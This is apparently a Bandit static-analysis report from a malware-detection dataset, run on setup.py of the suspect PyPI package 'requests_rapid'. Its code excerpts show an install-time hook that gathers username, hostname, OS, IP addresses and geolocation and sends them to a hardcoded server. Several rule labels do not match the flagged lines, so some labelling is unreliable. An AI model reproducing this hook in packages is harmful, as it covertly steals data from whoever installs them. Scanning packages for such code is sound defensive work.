Run started:2025-05-25 16:15:15.549706

Test results:
>> Issue: [B823:ip_found] ip_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:13
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b823_ip_found.html
12	# --- 配置 ---
13	SERVER_IP = "199.189.85.8" # 你的后台服务器IP
14	SERVER_PORT = 5000 # 假设你的后台服务器运行在5000端口

--------------------------------------------------
>> Issue: [B829:getuser] getpass.getuser
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:26
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b829_getuser.html
25	        # 1. 获取用户名
26	        data['username'] = getpass.getuser()
27	    except Exception:

--------------------------------------------------
>> Issue: [B329:blacklist] getpass_getuser
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:26
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b329-getpass-getuser
25	        # 1. 获取用户名
26	        data['username'] = getpass.getuser()
27	    except Exception:

--------------------------------------------------
>> Issue: [B803:gethostname] socket.gethostname
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:32
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b803_gethostname.html
31	        # 2. 获取机器名 (Hostname)
32	        data['hostname'] = socket.gethostname()
33	    except Exception:

--------------------------------------------------
>> Issue: [B302:blacklist] socket.gethostname
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:32
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b302-socket-gethostname
31	        # 2. 获取机器名 (Hostname)
32	        data['hostname'] = socket.gethostname()
33	    except Exception:

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:38
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
37	        # 3. 获取操作系统类型
38	        data['os_type'] = platform.system()
39	        data['os_version'] = platform.release()

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:38
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
37	        # 3. 获取操作系统类型
38	        data['os_type'] = platform.system()
39	        data['os_version'] = platform.release()

--------------------------------------------------
>> Issue: [B308:blacklist] platform.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:38
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b308-platform-system
37	        # 3. 获取操作系统类型
38	        data['os_type'] = platform.system()
39	        data['os_version'] = platform.release()

--------------------------------------------------
>> Issue: [B304:blacklist] socket.socket
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:46
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes
45	        # 4. 获取内网IP地址
46	        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
47	        s.settimeout(0)

--------------------------------------------------
>> Issue: [B808:settimeout] settimeout
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:47
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b808_settimeout.html
46	        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
47	        s.settimeout(0)
48	        try:

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:50
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
49	            # doesn't even have to be reachable
50	            s.connect(('10.254.254.254', 1))
51	            data['private_ip'] = s.getsockname()[0]

--------------------------------------------------
>> Issue: [B823:ip_found] ip_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:50
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b823_ip_found.html
49	            # doesn't even have to be reachable
50	            s.connect(('10.254.254.254', 1))
51	            data['private_ip'] = s.getsockname()[0]

--------------------------------------------------
>> Issue: [B823:ip_found] ip_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:53
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b823_ip_found.html
52	        except Exception:
53	            data['private_ip'] = '127.0.0.1' # Fallback
54	        finally:

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:55
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
54	        finally:
55	            s.close()
56	    except Exception:

--------------------------------------------------
>> Issue: [B818:urlopen] urllib.request.urlopen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:66
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b818_urlopen.html
65	        # 尝试从 api.ipify.org 获取公网 IP
66	        with request.urlopen('https://api.ipify.org?format=json', timeout=5) as response:
67	            ip_data = json.loads(response.read().decode('utf-8'))

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:66
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
65	        # 尝试从 api.ipify.org 获取公网 IP
66	        with request.urlopen('https://api.ipify.org?format=json', timeout=5) as response:
67	            ip_data = json.loads(response.read().decode('utf-8'))

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:67
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
66	        with request.urlopen('https://api.ipify.org?format=json', timeout=5) as response:
67	            ip_data = json.loads(response.read().decode('utf-8'))
68	            public_ip = ip_data.get('ip', 'Unknown')

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:76
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
75	                 # 注意URL编码
76	                geo_url = f"http://ip-api.com/json/{parse.quote(public_ip)}"
77	                with request.urlopen(geo_url, timeout=5) as geo_response:

--------------------------------------------------
>> Issue: [B818:urlopen] urllib.request.urlopen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:77
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b818_urlopen.html
76	                geo_url = f"http://ip-api.com/json/{parse.quote(public_ip)}"
77	                with request.urlopen(geo_url, timeout=5) as geo_response:
78	                    geo_data = json.loads(geo_response.read().decode('utf-8'))

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:78
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
77	                with request.urlopen(geo_url, timeout=5) as geo_response:
78	                    geo_data = json.loads(geo_response.read().decode('utf-8'))
79	                    if geo_data.get('status') == 'success':

--------------------------------------------------
>> Issue: [B818:urlopen] urllib.request.urlopen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:120
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b818_urlopen.html
119	        # 设置超时，避免安装卡死
120	        with request.urlopen(req, timeout=10) as response:
121	            # 简单打印响应状态，避免干扰安装过程

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:151
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
150	            # 更可靠（但更慢）的方式是不使用线程直接调用 send_data_to_server(user_data)
151	            sender_thread = threading.Thread(target=send_data_to_server, args=(user_data,))
152	            sender_thread.daemon = True # 设置为守护线程，主程序退出时它也会退出

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/requests_rapid-1.0.0/requests_rapid-1.0.0/requests_rapid-1.0.0/setup.py:176
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
175	    long_description_content_type="text/markdown",
176	    url="https://example.com", # 替换成你的项目URL（如果需要）
177	    packages=setuptools.find_packages(),

--------------------------------------------------

Code scanned:
	Total lines of code: 138
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 10.0
		High: 13.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 19.0
		High: 4.0
Files skipped (0):
